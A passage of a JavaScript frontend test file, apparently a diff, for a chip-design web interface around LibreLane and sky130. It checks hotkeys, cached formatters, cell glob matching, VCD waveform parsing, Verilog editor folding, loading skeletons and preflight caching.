+  assert.ok(CNM.makesRun("librelane config.yaml"));
+  assert.ok(!CNM.makesRun("librelane --version"));
+  assert.ok(!CNM.makesRun("openroad -exit x.tcl"));
+});
+
+check("hotkeys: a bare r runs only on Setup and Flow; Ctrl+Enter anywhere", () => {
+  assert.ok(HK.runKeyAllowed("r", { tab: "setup" }));
+  assert.ok(HK.runKeyAllowed("r", { tab: "pipeline" }));
+  assert.ok(!HK.runKeyAllowed("r", { tab: "verify" }));
+  assert.ok(!HK.runKeyAllowed("r", { tab: "layout" }));
+  assert.ok(HK.runKeyAllowed("Enter", { ctrl: true, tab: "verify" }));
+});
+
+check("console: Manual rail item is gone, go('manual') opens the drawer", () => {
+  const html = readFileSync(resolve(MOD, "..", "index.html"), "utf8");
+  assert.ok(!/data-tab="manual"/.test(html), "no Manual rail item");
+  assert.ok(!/id="sec-manual"/.test(html));
+  assert.match(html, /id="console-btn"/);
+  const nav = readFileSync(resolve(MOD, "nav.js"), "utf8");
+  assert.match(nav, /tab === "manual" \|\| tab === "console"/);
+});
+
+// ---------- performance pass: cached formatters and the compiled matcher ----------
+const IC = await import(toUrl(resolve(MOD, "intlcache.js")));
+check("intlcache: cached number formats match toLocaleString exactly", () => {
+  const nums = [0, -0, 1, -1, 12.5, 1234.5678, -98765.4321, 1e6, 0.000123, 7214.42, 1226];
+  const opts = [undefined, { maximumFractionDigits: 0 }, { maximumFractionDigits: 2 }, { maximumFractionDigits: 3 },
+    { minimumFractionDigits: 2, maximumFractionDigits: 2 }, { minimumFractionDigits: 0, maximumFractionDigits: 4 }];
+  for (const n of nums) for (const o of opts) {
+    assert.equal(IC.localeNum(n, "en-US", o), n.toLocaleString("en-US", o));
+    assert.equal(IC.localeNum(n, "en-US", o), n.toLocaleString("en-US", o));   // second call: from the cache
+  }
+  assert.equal(IC.localeNum(1234567), (1234567).toLocaleString("en-US"));
+});
+check("intlcache: cached date formats match Date#toLocale*String", () => {
+  const ds = [new Date(2026, 9, 28, 4, 19, 7), new Date(2025, 0, 1, 23, 59, 59), new Date(2026, 5, 3, 12, 0, 0)];
+  for (const d of ds) {
+    assert.equal(IC.localeTime(d, [], { hour: "2-digit", minute: "2-digit" }), d.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }));
+    assert.equal(IC.localeDate(d, [], { day: "numeric", month: "short", year: undefined }), d.toLocaleDateString([], { day: "numeric", month: "short", year: undefined }));
+    assert.equal(IC.localeDate(d, [], { day: "numeric", month: "short", year: "numeric" }), d.toLocaleDateString([], { day: "numeric", month: "short", year: "numeric" }));
+    assert.equal(IC.localeDateTime(d, undefined, { dateStyle: "medium", timeStyle: "short" }), d.toLocaleString(undefined, { dateStyle: "medium", timeStyle: "short" }));
+    // no options: each method's own defaults (date and time / date / time)
+    assert.equal(IC.localeDateTime(d), d.toLocaleString());
+    assert.equal(IC.localeDate(d), d.toLocaleDateString());
+    assert.equal(IC.localeTime(d), d.toLocaleTimeString());
+    assert.equal(IC.localeTime(d, "en-US", { hour: "numeric" }), d.toLocaleTimeString("en-US", { hour: "numeric" }));
+    assert.equal(IC.localeDate(d, "en-GB", { weekday: "long" }), d.toLocaleDateString("en-GB", { weekday: "long" }));
+  }
+});
+check("cells: the compiled matcher catches exactly what per-pattern globs catch", () => {
+  const names = ["sky130_fd_sc_hd__dlygate4sd3_1", "sky130_fd_sc_hd__buf_16", "sky130_fd_sc_hd__buf_1", "sky130_fd_sc_hd__a2bb2o_1",
+    "a.b", "axb", "lib$cell", "x(1)", "sky130_fd_sc_hd__probe_p_8", "sky130_fd_sc_hd__lpflow_inputiso0n_1", "[weird]"];
+  const lists = [[], ["*dlygate*"], ["*buf_16", "*probe_p_*", "*lpflow*"], ["a?b"], ["a.b"], ["lib$cell"], ["x(1)"], ["[weird]"], ["*"], ["sky130_fd_sc_hd__buf_?"]];
+  for (const pats of lists) {
+    const want = names.filter((n) => CM.globMatch(n, pats).length > 0);
+    const got = names.filter(CM.globMatcher(pats));
+    assert.deepEqual(got, want, "patterns " + JSON.stringify(pats));
+    assert.equal(CM.globMatcher(pats), CM.globMatcher(pats.slice()), "same patterns: one compiled matcher");
+  }
+});
+
+const VC = await import(toUrl(resolve(MOD, "ide", "vcd.js")));
+check("vcd.js: a dump packed for the worker unpacks to exactly what parseVCD gives", () => {
+  const extra = "$timescale 10 ps $end\n$scope module t $end\n$var wire 1 ! a $end\n$var wire 8 \" b [7:0] $end\n$var real 64 # r $end\n$var wire 1 $ never $end\n$upscope $end\n$enddefinitions $end\n" +
+    "#0\n0!\nb0 \"\nr1.5 #\n#5\n1!\nb\n#10\nb1010 \"\n0!\n#12345678901\nr-2e-3 #\n";
+  for (const text of [GOLDEN_VCD, extra]) {
+    const a = VC.parseVCD(text);
+    const m = VC.packVCD(VC.parseVCD(text)).msg;
+    const b = VC.unpackVCD(structuredClone(m));
+    for (const k of ["timescale", "tick", "end", "signals", "vars", "scopes"]) assert.deepEqual(b[k], a[k], k);
+    assert.deepEqual(Object.keys(b.byId), Object.keys(a.byId));
+    for (const id of Object.keys(a.byId)) {
+      assert.deepEqual(b.byId[id].changes, a.byId[id].changes, "changes of " + id);
+      assert.equal(b.byId[id].name, a.byId[id].name); assert.equal(b.byId[id].width, a.byId[id].width);
+    }
+    assert.equal(VC.valueAt(b.byId[Object.keys(a.byId)[0]], a.end), VC.valueAt(a.byId[Object.keys(a.byId)[0]], a.end));
+  }
+  let seen = 0;
+  VC.parseVCD("$enddefinitions $end\n" + "#1\n".repeat(200000), { onProgress: () => { seen++; } });
+  assert.ok(seen >= 2, "progress reported while parsing");
+});
+
+const ED = await import(toUrl(resolve(MOD, "ide", "editor.js")));
+const CMV = await import(toUrl(resolve(MOD, "..", "vendor", "codemirror.js")));
+check("ide editor: line-cached fold pairs equal the whole-text reading", () => {
+  const pool = [
+    "module m (input clk);", "endmodule", "  always @(posedge clk) begin", "  end", "begin end", "  if (a) begin : blk",
+    "  end else begin", "case (s)", "endcase", "function automatic f;", "endfunction", "extern function g;", "task t;", "endtask",
+    "fork", "join", "join_any", "wait fork;", "disable fork;", "generate", "endgenerate", "// begin end module", "/* begin */ end",
+    "/* begin", "still comment end", "*/ begin", "x = \"begin /* end\";", "y = \"unterminated begin", "`define begin end", "`begin",
+    "/*/ begin", "a /* b */ c /* d", "**/ end", "pure function h;", "import task k;", "constructor begin", "", "   ", "end /* x */ end",
+    "property p;", "endproperty", "class c;", "endclass", "covergroup g;", "endgroup", "begin // end", "/**/ begin",
+  ];
+  let seed = 7;
+  const rnd = (n) => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
+  for (let k = 0; k < 400; k++) {
+    const lines = Array.from({ length: 1 + rnd(40) }, () => pool[rnd(pool.length)]);
+    const doc = CMV.EditorState.create({ doc: lines.join("\n") }).doc;
+    assert.deepEqual([...ED.blockPairs(doc)], [...ED.blockPairsFull(doc)], "doc:\n" + lines.join("\n"));
+  }
+  // typing into one document, character by character (the caches carry over)
+  let st = CMV.EditorState.create({ doc: "module m;\n  always @(posedge clk) begin\n    x <= 1;\n  end\nendmodule\n" });
+  const typed = "  /* note begin\n  initial begin\n    y = \"end\";\n  end */\n  begin\n  end\n";
+  for (const ch of typed) {
+    st = st.update({ changes: { from: st.doc.length - 10, insert: ch } }).state;
+    assert.deepEqual([...ED.blockPairs(st.doc)], [...ED.blockPairsFull(st.doc)], "after typing " + JSON.stringify(ch));
+  }
+});
+
+// ---------------------------------------------------------------- perf pass: shell, boot, Run
+const LD = await import(toUrl(resolve(MOD, "loading.js")));
+const PF = await import(toUrl(resolve(MOD, "preflight.js")));
+
+check("loading: a skeleton shows only after the delay, and never over content", () => {
+  assert.equal(LD.skeletonDue(0), false);
+  assert.equal(LD.skeletonDue(LD.SKELETON_DELAY_MS - 1), false);
+  assert.equal(LD.skeletonDue(LD.SKELETON_DELAY_MS), true);
+  assert.equal(LD.skeletonDue(5000, { hasContent: true }), false, "stale content stays, no skeleton over it");
+  assert.equal(LD.skeletonDue(0, { delay: 0 }), true);
+});
+
+check("loading: every page has a skeleton shaped like it", () => {
+  for (const tab of ["setup", "ide", "cells", "pipeline", "runs", "layout", "analytics", "verify", "tools"]) {
+    const html = LD.pageSkeleton(tab);
+    assert.match(html, /class='ld-/, tab);
+    assert.doesNotMatch(html, /No runs|No run yet|Open a project/i, tab + " skeleton must not read as an empty state");
+  }
+  assert.equal((LD.pageSkeleton("pipeline").match(/class='ld-tile'/g) || []).length, 7, "Flow's seven stages");
+});
+
+await checkAsync("loading: onceLoader shares one load and retries after a failure", async () => {
+  let n = 0, fail = true;
+  const load = LD.onceLoader(() => { n++; if (fail) throw new Error("x"); return "lib"; });
+  await assert.rejects(load());
+  assert.equal(n, 1);
+  fail = false;
+  const [a, b] = await Promise.all([load(), load()]);
+  assert.equal(a, "lib"); assert.equal(b, "lib");
+  assert.equal(n, 2, "two callers, one load after the failed one");
+  assert.equal(await load(), "lib");
+  assert.equal(n, 2);
+});
+
+check("preflight: a result is reused only for the same picks while fresh", () => {
+  const s = { designDir: "/p/spm", selectedPdk: "sky130A", selectedScl: "sky130_fd_sc_hd", runMode: "container" };
+  const key = PF.preflightKey(s);
+  const last = { result: { ready: true }, key, at: 1000 };
+  assert.deepEqual(PF.reusablePreflight(last, { key, now: 1000 + 5000 }), { ready: true });
+  assert.equal(PF.reusablePreflight(last, { key, now: 1000 + PF.PREFLIGHT_FRESH_MS + 1 }), null, "stale");
+  assert.equal(PF.reusablePreflight(last, { key: PF.preflightKey({ ...s, selectedPdk: "sky130B" }), now: 2000 }), null, "other PDK");
+  assert.equal(PF.reusablePreflight(last, { key: PF.preflightKey({ ...s, runMode: "local" }), now: 2000 }), null, "other mode");
+  assert.equal(PF.reusablePreflight(last, { key: PF.preflightKey({ ...s, designDir: "/p/other" }), now: 2000 }), null, "other project");
+  assert.equal(PF.reusablePreflight({ ...last, at: 0 }, { key, now: 2000 }), null, "forgotten (at 0) is not fresh");
+  assert.equal(PF.reusablePreflight(last, { key, now: 500 }), null, "a clock that went back is not fresh");
+  assert.equal(PF.reusablePreflight(null, { key, now: 2000 }), null);
+});
+
+check("preflight: what a check means for a Run click", () => {
+  assert.equal(PF.runBlocker(null), null, "no check: nothing known, the run starts");
+  assert.equal(PF.runBlocker({ ready: true, pdk: {} }), null);
+  const mm = { message: "x", config: { pdk: "sky130B" } };
+  assert.deepEqual(PF.runBlocker({ ready: false, pdk: { mismatch: mm }, blockers: ["PDK"] }), { kind: "mismatch", mismatch: mm });
+  assert.deepEqual(PF.runBlocker({ ready: false, pdk: {}, blockers: ["no Docker"] }), { kind: "blockers", blockers: ["no Docker"] });
+});
+
+await checkAsync("setup: the server's refusals read in plain words", async () => {
+  const SU2 = await import(toUrl(resolve(MOD, "setup.js")));
+  assert.match(SU2.refusalText("already running"), /already going/);
+  assert.match(SU2.refusalText("HTTP 502"), /didn't answer/);
+  const ws = "The project path has spaces in it.";
+  assert.equal(SU2.refusalText(ws), ws, "a plain refusal is kept as the server wrote it");
+});
+
+check("boot: index.html preloads exactly app.js's static imports, and no blocking ECharts", () => {
+  const html = readFileSync(resolve(MOD, "..", "index.html"), "utf8");
+  assert.doesNotMatch(html, /<script[^>]+echarts/, "ECharts loads on demand (loading.js)");
+  const pre = new Set([...html.matchAll(/rel="modulepreload" href="\/static\/([^"]+)"/g)].map((m) => m[1]));
+  const seen = new Set();
+  const walk = (rel) => {
+    if (seen.has(rel)) return;
+    seen.add(rel);
+    const src = readFileSync(resolve(MOD, "..", rel), "utf8");
+    for (const m of src.matchAll(/^\s*import\s+(?:[^'"]*?\s+from\s+)?["']([^"']+)["']/gm)) {
+      const parts = rel.split("/"); parts.pop();
+      for (const seg of m[1].split("/")) { if (seg === "..") parts.pop(); else if (seg !== ".") parts.push(seg); }
+      walk(parts.join("/"));
+    }
+  };
+  walk("app.js");
+  const missing = [...seen].filter((f) => !pre.has(f));
+  const extra = [...pre].filter((f) => !seen.has(f));
+  assert.deepEqual(missing, [], "add a modulepreload for these (a static import of the first paint)");
+  assert.deepEqual(extra, [], "remove these modulepreloads (no longer imported at start)");
+  for (const page of ["flow.js", "runs.js", "tools.js", "analytics.js"]) assert.ok(!seen.has("modules/" + page), page + " loads on demand");
 });
 
 console.log(`\nfrontend_test: ${passed} checks passed` +
